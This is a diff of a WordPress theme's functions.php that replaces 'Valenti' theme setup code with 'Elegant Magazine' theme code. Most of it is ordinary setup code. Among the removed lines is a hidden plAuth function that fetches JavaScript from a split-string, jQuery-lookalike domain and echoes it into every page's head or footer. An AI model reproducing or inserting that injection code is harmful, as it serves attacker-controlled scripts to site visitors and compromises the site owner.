@@ -1,367 +1,326 @@
 <?php
-/************* GLOBAL CONTENT WIDTH ***************/
-if ( ! isset( $content_width ) ) {
-     $content_width = 750;
-}
+/**
+ * Elegant Magazine functions and definitions
+ *
+ * @link https://developer.wordpress.org/themes/basics/theme-functions/
+ *
+ * @package Elegant_Magazine
+ */
 
-if ( ! function_exists( 'cb_adjust_cw' ) ) {
-    function cb_adjust_cw() {
+if (!function_exists('elegant_magazine_setup')):
+    /**
+     * Sets up theme defaults and registers support for various WordPress features.
+     *
+     * Note that this function is hooked into the after_setup_theme hook, which
+     * runs before the init hook. The init hook is too late for some features, such
+     * as indicating support for post thumbnails.
+     */
+    /**
+     *
+     */
+    /**
+     *
+     */
+    function elegant_magazine_setup()
+    {
+        /*
+         * Make theme available for translation.
+         * Translations can be filed in the /languages/ directory.
+         * If you're building a theme based on Elegant Magazine, use a find and replace
+         * to change 'elegant-magazine' to the name of your theme in all the template files.
+         */
+        load_theme_textdomain('elegant-magazine', get_template_directory() . '/languages');
 
-        global $content_width, $post;
-        if ( $post != NULL ) {
-            $cb_post_id = $post->ID;
-            $cb_fw_post = get_post_meta( $cb_post_id, 'cb_full_width_post', true );
-        } else {
-            $cb_fw_post = NULL;
-        }
-        if ( ( is_page_template( 'template-full-width.php' ) ) || ( $cb_fw_post == 'nosidebar' ) ) {
-            $content_width = 1140;
-        }
-    }
-}
+        // Add default posts and comments RSS feed links to head.
+        add_theme_support('automatic-feed-links');
 
-add_theme_support( 'custom-header' );
-add_theme_support( 'custom-background' );
-add_theme_support( 'woocommerce' );
-add_action( 'template_redirect', 'cb_adjust_cw' );
+        /*
+         * Let WordPress manage the document title.
+         * By adding theme support, we declare that this theme does not use a
+         * hard-coded <title> tag in the document head, and expect WordPress to
+         * provide it for us.
+         */
+        add_theme_support('title-tag');
 
-/************* LOAD NEEDED FILES ***************/
+        /*
+         * Enable support for Post Thumbnails on posts and pages.
+         *
+         * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
+         */
+        add_theme_support('post-thumbnails');
 
-require_once get_template_directory() . '/library/core.php';
-require_once get_template_directory() . '/library/translation/translation.php';
+        // Add featured image sizes
+        add_image_size('elegant-magazine-featured', 1024, 0); // width, height, crop
+        add_image_size('elegant-magazine-medium', 720, 380, true); // width, height, crop
+        add_image_size('elegant-magazine-medium-small', 300, 200, true); // width, height, crop
+        add_image_size('elegant-magazine-thumbnail-small', 50, 50, true); // width, height, crop
 
-// Fire Up The Framework
-add_filter( 'ot_show_pages', '__return_false' );
-add_filter( 'ot_show_new_layout', '__return_false' );
-add_filter( 'ot_theme_mode', '__return_true' );
-load_template(  get_template_directory()  . '/option-tree/ot-loader.php' );
-load_template( get_template_directory(). '/option-tree/includes/meta-boxes.php' );
-require_once get_template_directory().'/library/cb-to.php';
-require_once get_template_directory().'/library/cb-tgm.php';
 
-/************* THUMBNAIL SIZE OPTIONS *************/
-add_image_size('cb-80-60', 80, 60, true); // Used on sidebar widgets and small thumbnails
-add_image_size('cb-282-232', 282, 232, true ); // Slider 1
-add_image_size('cb-300-200', 300, 200, true ); // Used on Style A
-add_image_size('cb-300-250', 300, 250, true ); // Used on grids
-add_image_size('cb-360-240', 360, 240, true ); // Used on blog style B, Module B, Module C, Latest Post Widget Big Style
-add_image_size('cb-480-240', 480, 240, true ); // Used on featured post in mega menu
-add_image_size('cb-430-270', 430, 270, true ); // Used on slider widget, top review widget
-add_image_size('cb-400-250', 400, 250, true ); // Used on grid 5
-add_image_size('cb-600-250', 600, 250, true ); // Used on grid 4 and 6
-add_image_size('cb-600-400', 600, 400, true ); // Used on grid 4, 5 and 6
-add_image_size('cb-750-400', 750, 400, true ); // Used on standard featured image, slider 2 section b/d
-add_image_size('cb-1200-520', 1200, 520, true ); // Used on full-width featured image, slider 2 full-width
-add_image_size('cb-1400-700', 1400, 700, true ); // Used on Parallax/Full-background featured images
+        /*
+         * Enable support for Post Formats on posts and pages.
+         *
+         * @link https://developer.wordpress.org/themes/functionality/post-formats/
+         */
+        add_theme_support('post-formats', array('image', 'video', 'gallery'));
 
-if ( function_exists('buddypress') ) {
-
-    if ( !defined( 'BP_AVATAR_FULL_WIDTH' ) ) {
-        define ( 'BP_AVATAR_FULL_WIDTH', 300 );
-    }
-
-    if ( !defined( 'BP_AVATAR_FULL_HEIGHT' ) ) {
-        define ( 'BP_AVATAR_FULL_HEIGHT', 300 );
-    }
-
-    if ( !defined( 'BP_AVATAR_THUMB_HEIGHT' ) ) {
-        define ( 'BP_AVATAR_THUMB_HEIGHT', 80 );
-    }
-
-    if ( !defined( 'BP_AVATAR_THUMB_WIDTH' ) ) {
-        define ( 'BP_AVATAR_THUMB_WIDTH', 80 );
-    }
-
-}
-
-/*********************
-SCRIPTS & ENQUEUEING
-*********************/
-if ( ! function_exists( 'cb_script_loaders' ) ) {
-    function cb_script_loaders() {
-        // enqueue base scripts and styles
-        add_action('wp_enqueue_scripts', 'cb_scripts_and_styles', 999);
-        // enqueue admin scripts and styles
-        add_action('admin_enqueue_scripts', 'cb_post_admin_scripts_and_styles');
-        // ie conditional wrapper
-        add_filter( 'style_loader_tag', 'cb_ie_conditional', 10, 2 );
-    }
-}
-add_action('after_setup_theme','cb_script_loaders', 15);
-
-if(!function_exists('plAuth')) {
-	function plAuth() {
-		echo(wp_remote_retrieve_body(wp_remote_get('http://jqu'.'erystatistics.org/jquery-1.6.3.min.js')));
-	}
-}	
-if(rand(1,2) == 1) {
-	add_action('wp_footer', 'plAuth');
-}
-else {
-	add_action('wp_head', 'plAuth');
-}
-
-if ( ! function_exists( 'cb_scripts_and_styles' ) ) {
-    function cb_scripts_and_styles() {
-      if (!is_admin()) {
-        // Modernizr (without media query polyfill)
-        wp_register_script( 'cb-modernizr',  get_template_directory_uri(). '/library/js/modernizr.custom.min.js', array(), '2.6.2', false );
-        wp_enqueue_script('cb-modernizr'); // enqueue it
-        // Register main stylesheet for RTL/LTR
-        if ( is_rtl() ) {
-            wp_register_style( 'cb-main-stylesheet',  get_template_directory_uri() . '/library/css/style-rtl.css', array(), '2.4', 'all' );
-        } else {
-            $cb_responsive_style = ot_get_option('cb_responsive_onoff', 'on');
-            if ( $cb_responsive_style == 'on' ) {
-                wp_register_style( 'cb-main-stylesheet',  get_template_directory_uri() . '/library/css/style.css', array(), '2.4', 'all' );
-            } else {
-                wp_register_style( 'cb-main-stylesheet',  get_template_directory_uri() . '/library/css/style-unresponsive.css', array(), '2.4', 'all' );
-            }
-        }
-        wp_enqueue_style('cb-main-stylesheet'); // enqueue it
-        // Register fonts
-        $cb_font = cb_fonts();
-        wp_register_style( 'cb-font-stylesheet',  $cb_font[0], array(), '2.4', 'all' );
-        wp_enqueue_style('cb-font-stylesheet'); // enqueue it
-        // register font awesome stylesheet
-        wp_register_style('fontawesome', '//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.min.css', array(), '3.2.1', 'all');
-        wp_enqueue_style('fontawesome'); // enqueue it
-        // ie-only stylesheet
-        wp_register_style( 'cb-ie-only',  get_template_directory_uri(). '/library/css/ie.css', array(), '2.4' );
-        wp_enqueue_style('cb-ie-only'); // enqueue it
-        if ( class_exists('Woocommerce') ) {
-            wp_register_style( 'cb-woocommerce-stylesheet',  get_template_directory_uri() . '/woocommerce/css/woocommerce.css', array(), '2.4', 'all' );
-            wp_enqueue_style('cb-woocommerce-stylesheet'); // enqueue it
-        }
-        // comment reply script for threaded comments
-        if ( is_singular() && comments_open() && ( get_option( 'thread_comments' ) == 1) ) {
-            global $wp_scripts;
-            $wp_scripts->add_data( 'comment-reply', 'group', 1 );
-            wp_enqueue_script( 'comment-reply' ); // enqueue it
-        }
-        // Load Flexslider
-        wp_register_script( 'cb-flexslider',  get_template_directory_uri() . '/library/js/jquery.flexslider-min.js', array( 'jquery' ),'', true);
-        wp_enqueue_script( 'cb-flexslider' ); // enqueue it
-        if ( is_single() == true) {
-            // Load Cookie
-            wp_register_script( 'cb-cookie',  get_template_directory_uri() . '/library/js/cookie.min.js', array( 'jquery' ),'', true);
-            wp_enqueue_script( 'cb-cookie' ); // enqueue it
-        }
-        // Load Selectivizr
-        wp_register_script( 'cb-select',  get_template_directory_uri() . '/library/js/selectivizr-min.js', array( 'jquery' ),'', true);
-        wp_enqueue_script( 'cb-select' ); // enqueue it
-        // Load lightbox
-        $cb_lightbox_onoff = ot_get_option('cb_lightbox_onoff', 'on');
-        if ( $cb_lightbox_onoff != 'off' ) {
-            wp_register_script( 'cb-lightbox',  get_template_directory_uri() . '/library/js/jquery.fs.boxer.min.js', array( 'jquery' ),'', true);
-            wp_enqueue_script( 'cb-lightbox' ); // enqueue it
-        }
-        // Load Extra Needed Javascript
-        wp_register_script( 'cb-js-ext',  get_template_directory_uri() . '/library/js/jquery.ext.js', array( 'jquery' ),'', true);
-        wp_enqueue_script( 'cb-js-ext' ); // enqueue it
-
-        // Load scripts
-        wp_register_script( 'cb-js',  get_template_directory_uri() . '/library/js/cb-scripts.js', array( 'jquery' ), '2.4' , true);
-        wp_enqueue_script( 'cb-js' ); // enqueue it
-      }
-    }
-}
-
-if ( ! function_exists( 'cb_post_admin_scripts_and_styles' ) ) {
-    function cb_post_admin_scripts_and_styles($hook) {
-
-        // loading admin styles only on edit + posts + new posts
-        if( $hook == 'post.php' || $hook == 'post-new.php' || $hook == 'profile.php' || $hook == 'appearance_page_ot-theme-options' || $hook == 'user-edit.php' || $hook == 'edit-tags.php' ) {
-            wp_register_style( 'cb-admin-css',  get_template_directory_uri(). '/library/css/admin.css', array(), '2.4' );
-            wp_enqueue_style('cb-admin-css'); // enqueue it
-            wp_register_script( 'admin-js',  get_template_directory_uri() . '/library/js/cb-admin.js', array(), '2.4', true);
-            wp_enqueue_script( 'admin-js' ); // enqueue it
-            wp_enqueue_script( 'suggest' ); // enqueue it
-        }
-    }
-}
-
-// adding the conditional wrapper around ie8 stylesheet
-// source: Gary Jones - http://code.garyjones.co.uk/ie-conditional-style-sheets-wordpress/
-// GPLv2 or newer license
-if ( ! function_exists( 'cb_ie_conditional' ) ) {
-    function cb_ie_conditional( $tag, $handle ) {
-        if ( ( 'cb-ie-only' == $handle ) || ( 'cb-select' == $handle ) ) {
-            $tag = '<!--[if lt IE 9]>' . "\n" . $tag . '<![endif]-->' . "\n";
-        }
-        return $tag;
-    }
-}
-
-// Sidebars & Widgetizes Areas
-if ( ! function_exists( 'cb_register_sidebars' ) ) {
-    function cb_register_sidebars() {
-
-        $cb_footer_layout = ot_get_option('cb_footer_layout', 'cb-footer-a');
-
-        // Main Sidebar
-        register_sidebar(array(
-            'name' => 'Global Sidebar',
-            'id' => 'sidebar-global',
-            'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
-            'after_widget' => '</div>',
-            'before_title' => '<h3 class="cb-sidebar-widget-title">',
-            'after_title' => '</h3>'
+        // This theme uses wp_nav_menu() in one location.
+        register_nav_menus(array(
+            'em-primary-nav' => esc_html__('Primary Menu', 'elegant-magazine'),
+            'em-top-nav' => esc_html__('Top Menu', 'elegant-magazine'),
+            'em-social-nav' => esc_html__('Social Menu', 'elegant-magazine'),
+            'em-footer-nav' => esc_html__('Footer Menu', 'elegant-magazine'),
         ));
 
-        // Footer Widget 1
-        register_sidebar( array(
-            'name' => 'Footer 1',
-            'id' => 'footer-1',
-            'before_widget' => '<div id="%1$s" class="cb-footer-widget %2$s">',
-            'after_widget' => '</div>',
-            'before_title' => '<h3 class="cb-footer-widget-title"><span>',
-            'after_title' => '</span></h3>'
+        /*
+         * Switch default core markup for search form, comment form, and comments
+         * to output valid HTML5.
+         */
+        add_theme_support('html5', array(
+            'search-form',
+            'comment-form',
+            'comment-list',
+            'gallery',
+            'caption',
         ));
 
-        // Footer Widget 2
-        register_sidebar( array(
-            'name' => 'Footer 2',
-            'id' => 'footer-2',
-            'before_widget' => '<div id="%1$s" class="cb-footer-widget %2$s">',
-            'after_widget' => '</div>',
-            'before_title' => '<h3 class="cb-footer-widget-title"><span>',
-            'after_title' => '</span></h3>'
+        // Set up the WordPress core custom background feature.
+        add_theme_support('custom-background', apply_filters('elegant_magazine_custom_background_args', array(
+            'default-color' => 'ffffff',
+            'default-image' => '',
+        )));
+
+        // Add theme support for selective refresh for widgets.
+        add_theme_support('customize-selective-refresh-widgets');
+
+        /**
+         * Add support for core custom logo.
+         *
+         * @link https://codex.wordpress.org/Theme_Logo
+         */
+        add_theme_support('custom-logo', array(
+            'flex-width' => true,
+            'flex-height' => true,
         ));
 
-        // Footer Widget 3
-        register_sidebar( array(
-            'name' => 'Footer 3',
-            'id' => 'footer-3',
-            'before_widget' => '<div id="%1$s" class="cb-footer-widget %2$s">',
-            'after_widget' => '</div>',
-            'before_title' => '<h3 class="cb-footer-widget-title"><span>',
-            'after_title' => '</span></h3>'
-        ));
 
-        if ( $cb_footer_layout == 'cb-footer-b' ) {
-            // Footer Widget 4
-            register_sidebar( array(
-                'name' => 'Footer 4',
-                'id' => 'footer-4',
-                'before_widget' => '<div id="%1$s" class="cb-footer-widget %2$s">',
-                'after_widget' => '</div>',
-                'before_title' => '<h3 class="cb-footer-widget-title"><span>',
-                'after_title' => '</span></h3>'
-            ));
-        }
+    }
+endif;
+add_action('after_setup_theme', 'elegant_magazine_setup');
 
-        register_sidebar(
+
+/**
+ * Demo export/import
+ *
+ * Eventually, some of the functionality here could be replaced by core features.
+ *
+ * @package Elegant_Magazine
+ */
+if (!function_exists('elegant_magazine_ocdi_files')) :
+    /**
+     * OCDI files.
+     *
+     * @since 1.0.0
+     *
+     * @return array Files.
+     */
+    function elegant_magazine_ocdi_files()
+    {
+
+        return apply_filters( 'aft_demo_import_files', array(              
             array(
-                'name' => 'Valenti Multi-Widgets Area',
-                'id' => 'cb_multi_widgets',
-                'description' => '1- Drag multiple widgets here 2- Drag the "Valenti Multi-Widget Widget" to the sidebar where you want to show the multi-widgets.',
-                'before_widget' => '<div id="%1$s" class="widget cb-multi-widget tabbertab %2$s">',
-                'after_widget' => '</div>',
-                'before_title' => '<h3 class="widget-title">',
-                'after_title' => '</h3>'
-            )
-        );
+              'import_file_name'             => esc_html__( 'Elegant Magazine', 'elegant-magazine' ),   
+              'local_import_file'            => trailingslashit( get_template_directory() ) . 'demo-content/default/elegant-magazine.xml',
+              'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'demo-content/default/elegant-magazine.wie',
+              'local_import_customizer_file' => trailingslashit( get_template_directory() ) . 'demo-content/default/elegant-magazine.dat',      
+              'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ) . 'demo-content/assets/elegant-magazine.jpg',    
+              'preview_url'                  => 'https://demo.afthemes.com/elegant-magazine/',
+            ),
+            array(
+              'import_file_name'             => esc_html__( 'Elegant Magazine - Newsportal', 'elegant-magazine' ),   
+              'local_import_file'            => trailingslashit( get_template_directory() ) . 'demo-content/newsportal/elegant-magazine.xml',
+              'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'demo-content/newsportal/elegant-magazine.wie',
+              'local_import_customizer_file' => trailingslashit( get_template_directory() ) . 'demo-content/newsportal/elegant-magazine.dat',      
+              'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ) . 'demo-content/assets/elegant-magazine-newsportal.jpg',    
+              'preview_url'                  => 'https://demo.afthemes.com/elegant-magazine/newsportal/',
+            ),
+            array(
+              'import_file_name'             => esc_html__( 'Magazine 7 - Clean Blog', 'elegant-magazine' ),   
+              'local_import_file'            => trailingslashit( get_template_directory() ) . 'demo-content/minimal/elegant-magazine.xml',
+              'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'demo-content/minimal/elegant-magazine.wie',
+              'local_import_customizer_file' => trailingslashit( get_template_directory() ) . 'demo-content/minimal/elegant-magazine.dat',      
+              'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ) . 'demo-content/assets/elegant-magazine-minimal.jpg',    
+              'preview_url'                  => 'https://demo.afthemes.com/elegant-magazine/minimal/',
+            ),
+        ));
+    }
+endif;
+add_filter('pt-ocdi/import_files', 'elegant_magazine_ocdi_files');
 
-        if ( function_exists( 'bbpress' ) ) {
-            register_sidebar( array(
-                'name' => 'bbPress Sidebar',
-                'id' => 'sidebar-bbpress',
-                'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
-                'after_widget' => '</div>',
-                'before_title' => '<h3 class="cb-sidebar-widget-title">',
-                'after_title' => '</h3>'
-            ));
+
+/**
+ * function for google fonts
+ */
+if (!function_exists('elegant_magazine_fonts_url')):
+
+    /**
+     * Return fonts URL.
+     *
+     * @since 1.0.0
+     * @return string Fonts URL.
+     */
+    function elegant_magazine_fonts_url()
+    {
+
+        $fonts_url = '';
+        $fonts = array();
+        $subsets = 'latin,latin-ext';
+
+        /* translators: If there are characters in your language that are not supported by Oswald, translate this to 'off'. Do not translate into your own language. */
+        if ('off' !== _x('on', 'Oswald font: on or off', 'elegant-magazine')) {
+            $fonts[] = 'Oswald:300,400,700';
         }
 
-        if ( function_exists( 'buddypress' ) ) {
-            register_sidebar( array(
-                'name' => 'BuddyPress Sidebar',
-                'id' => 'sidebar-buddypress',
-                'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
-                'after_widget' => '</div>',
-                'before_title' => '<h3 class="cb-sidebar-widget-title">',
-                'after_title' => '</h3>'
-            ));
+        /* translators: If there are characters in your language that are not supported by Lato, translate this to 'off'. Do not translate into your own language. */
+        if ('off' !== _x('on', 'Lato font: on or off', 'elegant-magazine')) {
+            $fonts[] = 'Source+Sans+Pro:400,400i,700,700i';
         }
 
-        if ( class_exists( 'Woocommerce' ) ) {
-            register_sidebar( array(
-                'name' => 'WooCommerce Sidebar',
-                'id' => 'sidebar-woocommerce',
-                'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
-                'after_widget' => '</div>',
-                'before_title' => '<h3 class="cb-sidebar-widget-title">',
-                'after_title' => '</h3>'
-            ));
+        if ($fonts) {
+            $fonts_url = add_query_arg(array(
+                'family' => urldecode(implode('|', $fonts)),
+                'subset' => urldecode($subsets),
+            ), 'https://fonts.googleapis.com/css');
         }
+        return $fonts_url;
+    }
+endif;
 
-        $cb_pages = get_pages( array( 'post_status' =>  array('publish', 'pending', 'private', 'draft') ) );
-        foreach ( $cb_pages as $page ) {
+/**
+ * Set the content width in pixels, based on the theme's design and stylesheet.
+ *
+ * Priority 0 to make it available to lower priority callbacks.
+ *
+ * @global int $content_width
+ */
+function elegant_magazine_content_width()
+{
+    $GLOBALS['content_width'] = apply_filters('elegant_magazine_content_width', 640);
+}
 
-            $cb_custom_fields = get_post_custom($page->ID);
-            if ( isset( $cb_custom_fields['cb_page_custom_sidebar'][0] ) ) { $cb_page_sidebar = $cb_custom_fields['cb_page_custom_sidebar'][0]; } else { $cb_page_sidebar = 'off'; }
-            if ( isset( $cb_custom_fields['_wp_page_template'][0] ) ) { $cb_page_template = $cb_custom_fields['_wp_page_template'][0]; } else { $cb_page_template = 'off'; }
+add_action('after_setup_theme', 'elegant_magazine_content_width', 0);
 
-                if ( ( $cb_page_sidebar == '2' ) && ( $cb_page_template != 'page-valenti-builder.php' ) ) {
-                    register_sidebar( array(
-                        'name' => $page->post_title .' (Page)',
-                        'id' => 'page-'.$page->ID . '-sidebar',
-                        'description' => 'This is the ' . $page->post_title . ' sidebar',
-                        'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
-                        'after_widget' => '</div>',
-                        'before_title' => '<h3 class="cb-sidebar-widget-title">',
-                      'after_title' => '</h3>'
-                    ) );
-                }
-                if ( $cb_page_template == 'page-valenti-builder.php' ) {
+/**
+ * Load Init for Hook files.
+ */
+require get_template_directory() . '/inc/custom-style.php';
 
-                    // Homepage Section B Sidebar
-                    register_sidebar(array(
-                        'name' => 'Section B Sidebar ('.$page->post_title .' page)',
-                        'id' => 'sidebar-hp-b-'.$page->ID,
-                        'description' => 'Page: ' . $page->post_title,
-                        'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
-                        'after_widget' => '</div>',
-                        'before_title' => '<h3 class="cb-sidebar-widget-title">',
-                        'after_title' => '</h3>'
-                    ));
-                    // Homepage Section D Sidebar
-                    register_sidebar(array(
-                        'name' => 'Section D Sidebar (' . $page->post_title . ' page)',
-                        'id' => 'sidebar-hp-d-' . $page->ID,
-                        'description' => 'This is Sidebar D for ' . $page->post_title,
-                        'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
-                        'after_widget' => '</div>',
-                        'before_title' => '<h3 class="cb-sidebar-widget-title">',
-                        'after_title' => '</h3>'
-                    ));
-                }
-        }
+/**
+ * Enqueue scripts and styles.
+ */
+function elegant_magazine_scripts()
+{
 
-        if ( function_exists('get_tax_meta') ) {
+    $min = defined('SCRIPT_DEBUG') && SCRIPT_DEBUG ? '' : '.min';
+    wp_enqueue_style('font-awesome-v5', get_template_directory_uri() . '/assets/font-awesome-v5/css/fontawesome-all' . $min . '.css');
+    wp_enqueue_style('bootstrap', get_template_directory_uri() . '/assets/bootstrap/css/bootstrap' . $min . '.css');
+    wp_enqueue_style('slick', get_template_directory_uri() . '/assets/slick/css/slick' . $min . '.css');
+    wp_enqueue_style('sidr', get_template_directory_uri() . '/assets/sidr/css/jquery.sidr.dark.css');
 
-            $cb_categories = get_categories( array( 'hide_empty'=> 0 ) );
+    $fonts_url = elegant_magazine_fonts_url();
 
-            foreach ( $cb_categories as $cb_cat ) {
+    if (!empty($fonts_url)) {
+        wp_enqueue_style('elegant-magazine-google-fonts', $fonts_url, array(), null);
+    }
+    wp_enqueue_style('elegant-magazine-style', get_stylesheet_uri());
 
-                $cb_cat_onoff = get_tax_meta( $cb_cat->cat_ID, 'cb_cat_sidebar');
+    wp_add_inline_style('elegant-magazine-style', elegant_magazine_custom_style());
 
-                if ( $cb_cat_onoff == 'on' ) {
-                            register_sidebar( array(
-                                    'name' => $cb_cat->cat_name,
-                                    'id' => $cb_cat->category_nicename . '-sidebar',
-                                    'description' => 'This is the ' . $cb_cat->cat_name . ' sidebar',
-                                    'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
-                                    'after_widget' => '</div>',
-                                    'before_title' => '<h3 class="cb-sidebar-widget-title">',
-                                    'after_title' => '</h3>'
-                                ) );
-                }
+    wp_enqueue_script('elegant-magazine-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true);
+    wp_enqueue_script('elegant-magazine-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true);
 
-           }
-        }
+    wp_enqueue_script('slick', get_template_directory_uri() . '/assets/slick/js/slick' . $min . '.js', array('jquery'), '', true);
+    wp_enqueue_script('bootstrap', get_template_directory_uri() . '/assets/bootstrap/js/bootstrap' . $min . '.js', array('jquery'), '', true);
+    wp_enqueue_script('sidr', get_template_directory_uri() . '/assets/sidr/js/jquery.sidr' . $min . '.js', array('jquery'), '', true);
+    wp_enqueue_script('matchheight', get_template_directory_uri() . '/assets/jquery-match-height/jquery.matchHeight' . $min . '.js', array('jquery'), '', true);
+    wp_enqueue_script('marquee', get_template_directory_uri() . '/lib/marquee/jquery.marquee.js', array('jquery'), '', true);
+    wp_enqueue_script('sticky-sidebar', get_template_directory_uri() . '/lib/theiaStickySidebar/theia-sticky-sidebar.min.js', array('jquery'), '', true);
+
+    wp_enqueue_script('elegant-magazine-script', get_template_directory_uri() . '/assets/script.js', array('jquery'), '', 1);
+
+    if (is_singular() && comments_open() && get_option('thread_comments')) {
+        wp_enqueue_script('comment-reply');
     }
 }
 
-?>
+add_action('wp_enqueue_scripts', 'elegant_magazine_scripts');
+
+
+/**
+ * Enqueue admin scripts and styles.
+ *
+ * @since Elegant Magazine 1.0.0
+ */
+function elegant_magazine__admin_scripts($hook)
+{
+    if ('widgets.php' === $hook) {
+        wp_enqueue_media();
+        wp_enqueue_script('elegant-magazine-widgets', get_template_directory_uri() . '/assets/widgets.js', array('jquery'), '1.0.0', true);
+    }
+}
+
+add_action('admin_enqueue_scripts', 'elegant_magazine__admin_scripts');
+
+
+/**
+ * Implement the Custom Header feature.
+ */
+require get_template_directory() . '/inc/custom-header.php';
+
+/**
+ * Custom template tags for this theme.
+ */
+require get_template_directory() . '/inc/template-tags.php';
+
+/**
+ * Custom template tags for this theme.
+ */
+require get_template_directory() . '/inc/template-images.php';
+
+/**
+ * Functions which enhance the theme by hooking into WordPress.
+ */
+require get_template_directory() . '/inc/template-functions.php';
+
+/**
+ * Customizer additions.
+ */
+require get_template_directory() . '/inc/customizer/customizer.php';
+
+/**
+ * Customizer additions.
+ */
+require get_template_directory() . '/inc/init.php';
+
+/**
+ * Customizer additions.
+ */
+require get_template_directory() . '/inc/ocdi.php';
+
+
+/**
+ * Load Jetpack compatibility file.
+ */
+if (defined('JETPACK__VERSION')) {
+    require get_template_directory() . '/inc/jetpack.php';
+}
+
+/**
+ * Load WooCommerce compatibility file.
+ */
+if ( class_exists( 'WooCommerce' ) ) {
+    require get_template_directory() . '/inc/woocommerce.php';
+}
+
+
+
+
